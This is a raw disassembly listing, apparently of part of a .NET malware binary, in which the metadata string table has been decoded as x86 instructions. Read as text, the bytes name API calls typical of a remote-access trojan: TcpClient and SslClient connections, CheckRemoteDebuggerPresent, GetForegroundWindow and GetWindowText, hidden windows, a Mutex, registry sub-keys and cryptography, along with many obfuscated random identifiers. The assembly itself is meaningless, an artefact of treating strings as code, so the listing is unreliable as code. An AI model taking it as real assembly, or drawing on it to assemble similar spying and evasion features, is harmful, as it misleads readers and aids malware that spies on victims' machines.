  4099fc:	74 00                	je     0x4099fe
  4099fe:	57                   	push   %edi
  4099ff:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a03:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a0a:	74 5f                	je     0x409a6b
  409a0c:	53                   	push   %ebx
  409a0d:	73 6c                	jae    0x409a7b
  409a0f:	43                   	inc    %ebx
  409a10:	6c                   	insb   (%dx),%es:(%edi)
  409a11:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a18:	74 5f                	je     0x409a79
  409a1a:	53                   	push   %ebx
  409a1b:	73 6c                	jae    0x409a89
  409a1d:	43                   	inc    %ebx
  409a1e:	6c                   	insb   (%dx),%es:(%edi)
  409a1f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a26:	74 5f                	je     0x409a87
  409a28:	54                   	push   %esp
  409a29:	63 70 43             	arpl   %esi,0x43(%eax)
  409a2c:	6c                   	insb   (%dx),%es:(%edi)
  409a2d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a34:	74 5f                	je     0x409a95
  409a36:	54                   	push   %esp
  409a37:	63 70 43             	arpl   %esi,0x43(%eax)
  409a3a:	6c                   	insb   (%dx),%es:(%edi)
  409a3b:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a42:	74 68                	je     0x409aac
  409a44:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a46:	74 69                	je     0x409ab1
  409a48:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a4b:	65 41                	gs inc %ecx
  409a4d:	73 43                	jae    0x409a92
  409a4f:	6c                   	insb   (%dx),%es:(%edi)
  409a50:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a57:	73 74                	jae    0x409acd
  409a59:	65 6d                	gs insl (%dx),%es:(%edi)
  409a5b:	2e 4d                	cs dec %ebp
  409a5d:	61                   	popa
  409a5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a5f:	61                   	popa
  409a60:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a63:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a65:	74 00                	je     0x409a67
  409a67:	45                   	inc    %ebp
  409a68:	6e                   	outsb  %ds:(%esi),(%dx)
  409a69:	76 69                	jbe    0x409ad4
  409a6b:	72 6f                	jb     0x409adc
  409a6d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6e:	6d                   	insl   (%dx),%es:(%edi)
  409a6f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a71:	74 00                	je     0x409a73
  409a73:	53                   	push   %ebx
  409a74:	79 73                	jns    0x409ae9
  409a76:	74 65                	je     0x409add
  409a78:	6d                   	insl   (%dx),%es:(%edi)
  409a79:	2e 43                	cs inc %ebx
  409a7b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a7c:	6c                   	insb   (%dx),%es:(%edi)
  409a7d:	6c                   	insb   (%dx),%es:(%edi)
  409a7e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a83:	6e                   	outsb  %ds:(%esi),(%dx)
  409a84:	73 2e                	jae    0x409ab4
  409a86:	49                   	dec    %ecx
  409a87:	45                   	inc    %ebp
  409a88:	6e                   	outsb  %ds:(%esi),(%dx)
  409a89:	75 6d                	jne    0x409af8
  409a8b:	65 72 61             	gs jb  0x409aef
  409a8e:	74 6f                	je     0x409aff
  409a90:	72 2e                	jb     0x409ac0
  409a92:	67 65 74 5f          	addr16 gs je 0x409af5
  409a96:	43                   	inc    %ebx
  409a97:	75 72                	jne    0x409b0b
  409a99:	72 65                	jb     0x409b00
  409a9b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9c:	74 00                	je     0x409a9e
  409a9e:	47                   	inc    %edi
  409a9f:	65 74 43             	gs je  0x409ae5
  409aa2:	75 72                	jne    0x409b16
  409aa4:	72 65                	jb     0x409b0b
  409aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa7:	74 00                	je     0x409aa9
  409aa9:	43                   	inc    %ebx
  409aaa:	68 65 63 6b 52       	push   $0x526b6365
  409aaf:	65 6d                	gs insl (%dx),%es:(%edi)
  409ab1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab2:	74 65                	je     0x409b19
  409ab4:	44                   	inc    %esp
  409ab5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ab9:	67 65 72 50          	addr16 gs jb 0x409b0d
  409abd:	72 65                	jb     0x409b24
  409abf:	73 65                	jae    0x409b26
  409ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac2:	74 00                	je     0x409ac4
  409ac4:	67 65 74 5f          	addr16 gs je 0x409b27
  409ac8:	52                   	push   %edx
  409ac9:	65 6d                	gs insl (%dx),%es:(%edi)
  409acb:	6f                   	outsl  %ds:(%esi),(%dx)
  409acc:	74 65                	je     0x409b33
  409ace:	45                   	inc    %ebp
  409acf:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad0:	64 50                	fs push %eax
  409ad2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad3:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409ada:	5f                   	pop    %edi
  409adb:	43                   	inc    %ebx
  409adc:	6f                   	outsl  %ds:(%esi),(%dx)
  409add:	75 6e                	jne    0x409b4d
  409adf:	74 00                	je     0x409ae1
  409ae1:	67 65 74 5f          	addr16 gs je 0x409b44
  409ae5:	50                   	push   %eax
  409ae6:	72 6f                	jb     0x409b57
  409ae8:	63 65 73             	arpl   %esp,0x73(%ebp)
  409aeb:	73 6f                	jae    0x409b5c
  409aed:	72 43                	jb     0x409b32
  409aef:	6f                   	outsl  %ds:(%esi),(%dx)
  409af0:	75 6e                	jne    0x409b60
  409af2:	74 00                	je     0x409af4
  409af4:	47                   	inc    %edi
  409af5:	65 74 50             	gs je  0x409b48
  409af8:	61                   	popa
  409af9:	74 68                	je     0x409b63
  409afb:	52                   	push   %edx
  409afc:	6f                   	outsl  %ds:(%esi),(%dx)
  409afd:	6f                   	outsl  %ds:(%esi),(%dx)
  409afe:	74 00                	je     0x409b00
  409b00:	50                   	push   %eax
  409b01:	61                   	popa
  409b02:	72 61                	jb     0x409b65
  409b04:	6d                   	insl   (%dx),%es:(%edi)
  409b05:	65 74 65             	gs je  0x409b6d
  409b08:	72 69                	jb     0x409b73
  409b0a:	7a 65                	jp     0x409b71
  409b0c:	64 54                	fs push %esp
  409b0e:	68 72 65 61 64       	push   $0x64616572
  409b13:	53                   	push   %ebx
  409b14:	74 61                	je     0x409b77
  409b16:	72 74                	jb     0x409b8c
  409b18:	00 43 6f             	add    %al,0x6f(%ebx)
  409b1b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b1c:	76 65                	jbe    0x409b83
  409b1e:	72 74                	jb     0x409b94
  409b20:	00 68 42             	add    %ch,0x42(%eax)
  409b23:	41                   	inc    %ecx
  409b24:	59                   	pop    %ecx
  409b25:	6e                   	outsb  %ds:(%esi),(%dx)
  409b26:	6f                   	outsl  %ds:(%esi),(%dx)
  409b27:	68 71 44 65 52       	push   $0x52654471
  409b2c:	4f                   	dec    %edi
  409b2d:	73 74                	jae    0x409ba3
  409b2f:	00 46 61             	add    %al,0x61(%esi)
  409b32:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b39:	54 
  409b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3b:	4c                   	dec    %esp
  409b3c:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  409b43:	74 65                	je     0x409baa
  409b45:	6d                   	insl   (%dx),%es:(%edi)
  409b46:	2e 43                	cs inc %ebx
  409b48:	6f                   	outsl  %ds:(%esi),(%dx)
  409b49:	6c                   	insb   (%dx),%es:(%edi)
  409b4a:	6c                   	insb   (%dx),%es:(%edi)
  409b4b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b50:	6e                   	outsb  %ds:(%esi),(%dx)
  409b51:	73 2e                	jae    0x409b81
  409b53:	49                   	dec    %ecx
  409b54:	45                   	inc    %ebp
  409b55:	6e                   	outsb  %ds:(%esi),(%dx)
  409b56:	75 6d                	jne    0x409bc5
  409b58:	65 72 61             	gs jb  0x409bbc
  409b5b:	74 6f                	je     0x409bcc
  409b5d:	72 2e                	jb     0x409b8d
  409b5f:	4d                   	dec    %ebp
  409b60:	6f                   	outsl  %ds:(%esi),(%dx)
  409b61:	76 65                	jbe    0x409bc8
  409b63:	4e                   	dec    %esi
  409b64:	65 78 74             	gs js  0x409bdb
  409b67:	00 53 79             	add    %dl,0x79(%ebx)
  409b6a:	73 74                	jae    0x409be0
  409b6c:	65 6d                	gs insl (%dx),%es:(%edi)
  409b6e:	2e 54                	cs push %esp
  409b70:	65 78 74             	gs js  0x409be7
  409b73:	00 47 65             	add    %al,0x65(%edi)
  409b76:	74 57                	je     0x409bcf
  409b78:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409b7f:	78 74                	js     0x409bf5
  409b81:	00 44 56 58          	add    %al,0x58(%esi,%edx,2)
  409b85:	6a 79                	push   $0x79
  409b87:	43                   	inc    %ebx
  409b88:	79 4f                	jns    0x409bd9
  409b8a:	4b                   	dec    %ebx
  409b8b:	6d                   	insl   (%dx),%es:(%edi)
  409b8c:	4b                   	dec    %ebx
  409b8d:	4d                   	dec    %ebp
  409b8e:	76 45                	jbe    0x409bd5
  409b90:	75 00                	jne    0x409b92
  409b92:	56                   	push   %esi
  409b93:	45                   	inc    %ebp
  409b94:	62 56 4e             	bound  %edx,0x4e(%esi)
  409b97:	65 71 50             	gs jno 0x409bea
  409b9a:	6b 4d 53 75          	imul   $0x75,0x53(%ebp),%ecx
  409b9e:	00 57 63             	add    %dl,0x63(%edi)
  409ba1:	4e                   	dec    %esi
  409ba2:	68 42 7a 44 77       	push   $0x77447a42
  409ba7:	52                   	push   %edx
  409ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ba9:	5a                   	pop    %edx
  409baa:	75 68                	jne    0x409c14
  409bac:	53                   	push   %ebx
  409bad:	75 00                	jne    0x409baf
  409baf:	69 5a 43 77 62 74 45 	imul   $0x45746277,0x43(%edx),%ebx
  409bb6:	4c                   	dec    %esp
  409bb7:	75 47                	jne    0x409c00
  409bb9:	61                   	popa
  409bba:	75 00                	jne    0x409bbc
  409bbc:	70 66                	jo     0x409c24
  409bbe:	5a                   	pop    %edx
  409bbf:	4b                   	dec    %ebx
  409bc0:	43                   	inc    %ebx
  409bc1:	5a                   	pop    %edx
  409bc2:	57                   	push   %edi
  409bc3:	41                   	inc    %ecx
  409bc4:	50                   	push   %eax
  409bc5:	4a                   	dec    %edx
  409bc6:	45                   	inc    %ebp
  409bc7:	6b 75 00 4e          	imul   $0x4e,0x0(%ebp),%esi
  409bcb:	54                   	push   %esp
  409bcc:	6d                   	insl   (%dx),%es:(%edi)
  409bcd:	57                   	push   %edi
  409bce:	53                   	push   %ebx
  409bcf:	6b 41 67 7a          	imul   $0x7a,0x67(%ecx),%eax
  409bd3:	44                   	inc    %esp
  409bd4:	45                   	inc    %ebp
  409bd5:	71 6c                	jno    0x409c43
  409bd7:	75 00                	jne    0x409bd9
  409bd9:	57                   	push   %edi
  409bda:	6f                   	outsl  %ds:(%esi),(%dx)
  409bdb:	4d                   	dec    %ebp
  409bdc:	79 70                	jns    0x409c4e
  409bde:	67 73 4a             	addr16 jae 0x409c2b
  409be1:	45                   	inc    %ebp
  409be2:	67 41                	addr16 inc %ecx
  409be4:	62 6c 43 79          	bound  %ebp,0x79(%ebx,%eax,2)
  409be8:	75 00                	jne    0x409bea
  409bea:	70 73                	jo     0x409c5f
  409bec:	6f                   	outsl  %ds:(%esi),(%dx)
  409bed:	4e                   	dec    %esi
  409bee:	55                   	push   %ebp
  409bef:	67 6f                	outsl  %ds:(%si),(%dx)
  409bf1:	46                   	inc    %esi
  409bf2:	79 75                	jns    0x409c69
  409bf4:	00 47 54             	add    %al,0x54(%edi)
  409bf7:	72 69                	jb     0x409c62
  409bf9:	47                   	inc    %edi
  409bfa:	4d                   	dec    %ebp
  409bfb:	66 72 75             	data16 jb 0x409c73
  409bfe:	50                   	push   %eax
  409bff:	79 75                	jns    0x409c76
  409c01:	00 41 45             	add    %al,0x45(%ecx)
  409c04:	42                   	inc    %edx
  409c05:	77 76                	ja     0x409c7d
  409c07:	4b                   	dec    %ebx
  409c08:	54                   	push   %esp
  409c09:	50                   	push   %eax
  409c0a:	6a 78                	push   $0x78
  409c0c:	55                   	push   %ebp
  409c0d:	68 48 76 00 67       	push   $0x67007648
  409c12:	53                   	push   %ebx
  409c13:	55                   	push   %ebp
  409c14:	65 47                	gs inc %edi
  409c16:	79 75                	jns    0x409c8d
  409c18:	48                   	dec    %eax
  409c19:	6c                   	insb   (%dx),%es:(%edi)
  409c1a:	46                   	inc    %esi
  409c1b:	50                   	push   %eax
  409c1c:	4c                   	dec    %esp
  409c1d:	76 00                	jbe    0x409c1f
  409c1f:	4a                   	dec    %edx
  409c20:	7a 76                	jp     0x409c98
  409c22:	63 4d 46             	arpl   %ecx,0x46(%ebp)
  409c25:	6b 66 70 4c          	imul   $0x4c,0x70(%esi),%esp
  409c29:	4d                   	dec    %ebp
  409c2a:	76 00                	jbe    0x409c2c
  409c2c:	42                   	inc    %edx
  409c2d:	5a                   	pop    %edx
  409c2e:	49                   	dec    %ecx
  409c2f:	76 63                	jbe    0x409c94
  409c31:	66 42                	inc    %dx
  409c33:	57                   	push   %edi
  409c34:	4c                   	dec    %esp
  409c35:	43                   	inc    %ebx
  409c36:	6d                   	insl   (%dx),%es:(%edi)
  409c37:	49                   	dec    %ecx
  409c38:	61                   	popa
  409c39:	4d                   	dec    %ebp
  409c3a:	76 00                	jbe    0x409c3c
  409c3c:	42                   	inc    %edx
  409c3d:	46                   	inc    %esi
  409c3e:	63 56 42             	arpl   %edx,0x42(%esi)
  409c41:	58                   	pop    %eax
  409c42:	63 5a 51             	arpl   %ebx,0x51(%edx)
  409c45:	63 70 65             	arpl   %esi,0x65(%eax)
  409c48:	69 66 4f 76 00 59 54 	imul   $0x54590076,0x4f(%esi),%esp
  409c4f:	56                   	push   %esi
  409c50:	45                   	inc    %ebp
  409c51:	61                   	popa
  409c52:	4d                   	dec    %ebp
  409c53:	6f                   	outsl  %ds:(%esi),(%dx)
  409c54:	4b                   	dec    %ebx
  409c55:	68 45 51 68 57       	push   $0x57685145
  409c5a:	76 00                	jbe    0x409c5c
  409c5c:	4c                   	dec    %esp
  409c5d:	77 42                	ja     0x409ca1
  409c5f:	4d                   	dec    %ebp
  409c60:	71 63                	jno    0x409cc5
  409c62:	68 6e 63 76 00       	push   $0x76636e
  409c67:	56                   	push   %esi
  409c68:	6f                   	outsl  %ds:(%esi),(%dx)
  409c69:	6a 50                	push   $0x50
  409c6b:	61                   	popa
  409c6c:	72 6d                	jb     0x409cdb
  409c6e:	73 4d                	jae    0x409cbd
  409c70:	68 47 77 00 46       	push   $0x46007747
  409c75:	54                   	push   %esp
  409c76:	4f                   	dec    %edi
  409c77:	4b                   	dec    %ebx
  409c78:	6b 69 4b 69          	imul   $0x69,0x4b(%ecx),%ebp
  409c7c:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7d:	49                   	dec    %ecx
  409c7e:	4f                   	dec    %edi
  409c7f:	76 49                	jbe    0x409cca
  409c81:	77 00                	ja     0x409c83
  409c83:	79 73                	jns    0x409cf8
  409c85:	58                   	pop    %eax
  409c86:	54                   	push   %esp
  409c87:	53                   	push   %ebx
  409c88:	52                   	push   %edx
  409c89:	72 51                	jb     0x409cdc
  409c8b:	67 54                	addr16 push %esp
  409c8d:	71 4f                	jno    0x409cde
  409c8f:	77 00                	ja     0x409c91
  409c91:	63 4b 56             	arpl   %ecx,0x56(%ebx)
  409c94:	57                   	push   %edi
  409c95:	4b                   	dec    %ebx
  409c96:	6b 65 5a 57          	imul   $0x57,0x5a(%ebp),%esp
  409c9a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c9b:	53                   	push   %ebx
  409c9c:	62 57 77             	bound  %edx,0x77(%edi)
  409c9f:	00 52 65             	add    %dl,0x65(%edx)
  409ca2:	7a 44                	jp     0x409ce8
  409ca4:	62 49 4c             	bound  %ecx,0x4c(%ecx)
  409ca7:	68 66 77 00 68       	push   $0x68007766
  409cac:	55                   	push   %ebp
  409cad:	57                   	push   %edi
  409cae:	79 68                	jns    0x409d18
  409cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb1:	58                   	pop    %eax
  409cb2:	7a 6a                	jp     0x409d1e
  409cb4:	6d                   	insl   (%dx),%es:(%edi)
  409cb5:	77 00                	ja     0x409cb7
  409cb7:	47                   	inc    %edi
  409cb8:	65 74 46             	gs je  0x409d01
  409cbb:	6f                   	outsl  %ds:(%esi),(%dx)
  409cbc:	72 65                	jb     0x409d23
  409cbe:	67 72 6f             	addr16 jb 0x409d30
  409cc1:	75 6e                	jne    0x409d31
  409cc3:	64 57                	fs push %edi
  409cc5:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409ccc:	65 74 5f             	gs je  0x409d2e
  409ccf:	43                   	inc    %ebx
  409cd0:	72 65                	jb     0x409d37
  409cd2:	61                   	popa
  409cd3:	74 65                	je     0x409d3a
  409cd5:	4e                   	dec    %esi
  409cd6:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd7:	57                   	push   %edi
  409cd8:	69 6e 64 6f 77 00 48 	imul   $0x4800776f,0x64(%esi),%ebp
  409cdf:	6a 54                	push   $0x54
  409ce1:	52                   	push   %edx
  409ce2:	59                   	pop    %ecx
  409ce3:	79 6e                	jns    0x409d53
  409ce5:	59                   	pop    %ecx
  409ce6:	6d                   	insl   (%dx),%es:(%edi)
  409ce7:	76 6d                	jbe    0x409d56
  409ce9:	4a                   	dec    %edx
  409cea:	77 77                	ja     0x409d63
  409cec:	00 79 70             	add    %bh,0x70(%ecx)
  409cef:	73 62                	jae    0x409d53
  409cf1:	56                   	push   %esi
  409cf2:	59                   	pop    %ecx
  409cf3:	57                   	push   %edi
  409cf4:	46                   	inc    %esi
  409cf5:	52                   	push   %edx
  409cf6:	54                   	push   %esp
  409cf7:	55                   	push   %ebp
  409cf8:	58                   	pop    %eax
  409cf9:	4e                   	dec    %esi
  409cfa:	78 78                	js     0x409d74
  409cfc:	77 00                	ja     0x409cfe
  409cfe:	64 48                	fs dec %eax
  409d00:	52                   	push   %edx
  409d01:	71 72                	jno    0x409d75
  409d03:	43                   	inc    %ebx
  409d04:	55                   	push   %ebp
  409d05:	43                   	inc    %ebx
  409d06:	49                   	dec    %ecx
  409d07:	4d                   	dec    %ebp
  409d08:	78 00                	js     0x409d0a
  409d0a:	45                   	inc    %ebp
  409d0b:	69 73 52 7a 62 52 59 	imul   $0x5952627a,0x52(%ebx),%esi
  409d12:	69 64 70 50 51 78 00 	imul   $0x42007851,0x50(%eax,%esi,2),%esp
  409d19:	42 
  409d1a:	55                   	push   %ebp
  409d1b:	77 74                	ja     0x409d91
  409d1d:	76 7a                	jbe    0x409d99
  409d1f:	72 42                	jb     0x409d63
  409d21:	7a 69                	jp     0x409d8c
  409d23:	64 58                	fs pop %eax
  409d25:	53                   	push   %ebx
  409d26:	75 6b                	jne    0x409d93
  409d28:	52                   	push   %edx
  409d29:	78 00                	js     0x409d2b
  409d2b:	56                   	push   %esi
  409d2c:	4f                   	dec    %edi
  409d2d:	67 73 56             	addr16 jae 0x409d86
  409d30:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  409d33:	63 78 00             	arpl   %edi,0x0(%eax)
  409d36:	4d                   	dec    %ebp
  409d37:	75 74                	jne    0x409dad
  409d39:	65 78 00             	gs js  0x409d3c
  409d3c:	51                   	push   %ecx
  409d3d:	78 4a                	js     0x409d89
  409d3f:	73 50                	jae    0x409d91
  409d41:	6c                   	insb   (%dx),%es:(%edi)
  409d42:	46                   	inc    %esi
  409d43:	76 73                	jbe    0x409db8
  409d45:	72 55                	jb     0x409d9c
  409d47:	77 66                	ja     0x409daf
  409d49:	78 00                	js     0x409d4b
  409d4b:	5a                   	pop    %edx
  409d4c:	7a 61                	jp     0x409daf
  409d4e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d4f:	78 68                	js     0x409db9
  409d51:	6e                   	outsb  %ds:(%esi),(%dx)
  409d52:	6e                   	outsb  %ds:(%esi),(%dx)
  409d53:	68 78 00 4d 75       	push   $0x754d0078
  409d58:	7a 74                	jp     0x409dce
  409d5a:	6e                   	outsb  %ds:(%esi),(%dx)
  409d5b:	55                   	push   %ebp
  409d5c:	67 4f                	addr16 dec %edi
  409d5e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5f:	4d                   	dec    %ebp
  409d60:	72 42                	jb     0x409da4
  409d62:	79 00                	jns    0x409d64
  409d64:	6d                   	insl   (%dx),%es:(%edi)
  409d65:	7a 68                	jp     0x409dcf
  409d67:	54                   	push   %esp
  409d68:	4b                   	dec    %ebx
  409d69:	42                   	inc    %edx
  409d6a:	65 78 66             	gs js  0x409dd3
  409d6d:	43                   	inc    %ebx
  409d6e:	79 00                	jns    0x409d70
  409d70:	59                   	pop    %ecx
  409d71:	6c                   	insb   (%dx),%es:(%edi)
  409d72:	71 65                	jno    0x409dd9
  409d74:	54                   	push   %esp
  409d75:	61                   	popa
  409d76:	50                   	push   %eax
  409d77:	6f                   	outsl  %ds:(%esi),(%dx)
  409d78:	50                   	push   %eax
  409d79:	47                   	inc    %edi
  409d7a:	79 00                	jns    0x409d7c
  409d7c:	63 7a 45             	arpl   %edi,0x45(%edx)
  409d7f:	4f                   	dec    %edi
  409d80:	57                   	push   %edi
  409d81:	7a 73                	jp     0x409df6
  409d83:	6b 47 79 00          	imul   $0x0,0x79(%edi),%eax
  409d87:	42                   	inc    %edx
  409d88:	54                   	push   %esp
  409d89:	59                   	pop    %ecx
  409d8a:	6e                   	outsb  %ds:(%esi),(%dx)
  409d8b:	4a                   	dec    %edx
  409d8c:	41                   	inc    %ecx
  409d8d:	46                   	inc    %esi
  409d8e:	4a                   	dec    %edx
  409d8f:	51                   	push   %ecx
  409d90:	79 00                	jns    0x409d92
  409d92:	69 53 56 54 63 41 49 	imul   $0x49416354,0x56(%ebx),%edx
  409d99:	6b 56 79 00          	imul   $0x0,0x79(%esi),%edx
  409d9d:	6c                   	insb   (%dx),%es:(%edi)
  409d9e:	6d                   	insl   (%dx),%es:(%edi)
  409d9f:	62 6c 76 71          	bound  %ebp,0x71(%esi,%esi,2)
  409da3:	51                   	push   %ecx
  409da4:	50                   	push   %eax
  409da5:	71 4b                	jno    0x409df2
  409da7:	61                   	popa
  409da8:	73 72                	jae    0x409e1c
  409daa:	57                   	push   %edi
  409dab:	79 00                	jns    0x409dad
  409dad:	77 54                	ja     0x409e03
  409daf:	4d                   	dec    %ebp
  409db0:	67 53                	addr16 push %ebx
  409db2:	57                   	push   %edi
  409db3:	79 59                	jns    0x409e0e
  409db5:	49                   	dec    %ecx
  409db6:	63 61 79             	arpl   %esp,0x79(%ecx)
  409db9:	00 49 6e             	add    %cl,0x6e(%ecx)
  409dbc:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409dc3:	65 
  409dc4:	41                   	inc    %ecx
  409dc5:	72 72                	jb     0x409e39
  409dc7:	61                   	popa
  409dc8:	79 00                	jns    0x409dca
  409dca:	54                   	push   %esp
  409dcb:	6f                   	outsl  %ds:(%esi),(%dx)
  409dcc:	41                   	inc    %ecx
  409dcd:	72 72                	jb     0x409e41
  409dcf:	61                   	popa
  409dd0:	79 00                	jns    0x409dd2
  409dd2:	67 65 74 5f          	addr16 gs je 0x409e35
  409dd6:	41                   	inc    %ecx
  409dd7:	73 41                	jae    0x409e1a
  409dd9:	72 72                	jb     0x409e4d
  409ddb:	61                   	popa
  409ddc:	79 00                	jns    0x409dde
  409dde:	67 65 74 5f          	addr16 gs je 0x409e41
  409de2:	4b                   	dec    %ebx
  409de3:	65 79 00             	gs jns 0x409de6
  409de6:	73 65                	jae    0x409e4d
  409de8:	74 5f                	je     0x409e49
  409dea:	4b                   	dec    %ebx
  409deb:	65 79 00             	gs jns 0x409dee
  409dee:	43                   	inc    %ebx
  409def:	72 65                	jb     0x409e56
  409df1:	61                   	popa
  409df2:	74 65                	je     0x409e59
  409df4:	53                   	push   %ebx
  409df5:	75 62                	jne    0x409e59
  409df7:	4b                   	dec    %ebx
  409df8:	65 79 00             	gs jns 0x409dfb
  409dfb:	4f                   	dec    %edi
  409dfc:	70 65                	jo     0x409e63
  409dfe:	6e                   	outsb  %ds:(%esi),(%dx)
  409dff:	53                   	push   %ebx
  409e00:	75 62                	jne    0x409e64
  409e02:	4b                   	dec    %ebx
  409e03:	65 79 00             	gs jns 0x409e06
  409e06:	67 65 74 5f          	addr16 gs je 0x409e69
  409e0a:	50                   	push   %eax
  409e0b:	75 62                	jne    0x409e6f
  409e0d:	6c                   	insb   (%dx),%es:(%edi)
  409e0e:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409e15:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e1c:	4b 65 
  409e1e:	79 00                	jns    0x409e20
  409e20:	53                   	push   %ebx
  409e21:	79 73                	jns    0x409e96
  409e23:	74 65                	je     0x409e8a
  409e25:	6d                   	insl   (%dx),%es:(%edi)
  409e26:	2e 53                	cs push %ebx
  409e28:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e2c:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e33:	70 
  409e34:	74 6f                	je     0x409ea5
  409e36:	67 72 61             	addr16 jb 0x409e9a
  409e39:	70 68                	jo     0x409ea3
  409e3b:	79 00                	jns    0x409e3d
  409e3d:	57                   	push   %edi
  409e3e:	4b                   	dec    %ebx
  409e3f:	48                   	dec    %eax
  409e40:	79 46                	jns    0x409e88
  409e42:	43                   	inc    %ebx
  409e43:	59                   	pop    %ecx
  409e44:	74 50                	je     0x409e96
  409e46:	50                   	push   %eax
  409e47:	50                   	push   %eax
  409e48:	69 79 00 41 73 73 65 	imul   $0x65737341,0x0(%ecx),%edi
  409e4f:	6d                   	insl   (%dx),%es:(%edi)
  409e50:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e54:	41                   	inc    %ecx
  409e55:	64 64 72 65          	fs fs jb 0x409ebe
  409e59:	73 73                	jae    0x409ece
  409e5b:	46                   	inc    %esi
  409e5c:	61                   	popa
  409e5d:	6d                   	insl   (%dx),%es:(%edi)
  409e5e:	69 6c 79 00 61 56 67 	imul   $0x67675661,0x0(%ecx,%edi,2),%ebp
  409e65:	67 
  409e66:	6a 66                	push   $0x66
  409e68:	47                   	inc    %edi
  409e69:	4e                   	dec    %esi
  409e6a:	79 63                	jns    0x409ecf
  409e6c:	58                   	pop    %eax
  409e6d:	6d                   	insl   (%dx),%es:(%edi)
  409e6e:	79 00                	jns    0x409e70
  409e70:	42                   	inc    %edx
  409e71:	6c                   	insb   (%dx),%es:(%edi)
  409e72:	6f                   	outsl  %ds:(%esi),(%dx)
  409e73:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  409e76:	6f                   	outsl  %ds:(%esi),(%dx)
  409e77:	70 79                	jo     0x409ef2
  409e79:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409e7d:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e84:	65 74 5f             	gs je  0x409ee6
  409e87:	53                   	push   %ebx
  409e88:	79 73                	jns    0x409efd
  409e8a:	74 65                	je     0x409ef1
  409e8c:	6d                   	insl   (%dx),%es:(%edi)
  409e8d:	44                   	inc    %esp
  409e8e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e95:	79 00                	jns    0x409e97
  409e97:	52                   	push   %edx
  409e98:	65 67 69 73 74 72 79 	imul   $0x65007972,%gs:0x74(%bp,%di),%esi
  409e9f:	00 65 
  409ea1:	47                   	inc    %edi
  409ea2:	72 54                	jb     0x409ef8
  409ea4:	46                   	inc    %esi
  409ea5:	63 62 6a             	arpl   %esp,0x6a(%edx)
  409ea8:	57                   	push   %edi
  409ea9:	44                   	inc    %esp
  409eaa:	58                   	pop    %eax
  409eab:	73 79                	jae    0x409f26
  409ead:	00 67 6c             	add    %ah,0x6c(%edi)
  409eb0:	42                   	inc    %edx
  409eb1:	4a                   	dec    %edx
  409eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  409eb3:	5a                   	pop    %edx
  409eb4:	5a                   	pop    %edx
  409eb5:	53                   	push   %ebx
  409eb6:	64 73 79             	fs jae 0x409f32
  409eb9:	00 6f 70             	add    %ch,0x70(%edi)
  409ebc:	5f                   	pop    %edi
  409ebd:	45                   	inc    %ebp
  409ebe:	71 75                	jno    0x409f35
  409ec0:	61                   	popa
  409ec1:	6c                   	insb   (%dx),%es:(%edi)
  409ec2:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409ec9:	49 
  409eca:	6e                   	outsb  %ds:(%esi),(%dx)
  409ecb:	65 71 75             	gs jno 0x409f43
  409ece:	61                   	popa
  409ecf:	6c                   	insb   (%dx),%es:(%edi)
  409ed0:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409ed7:	74 
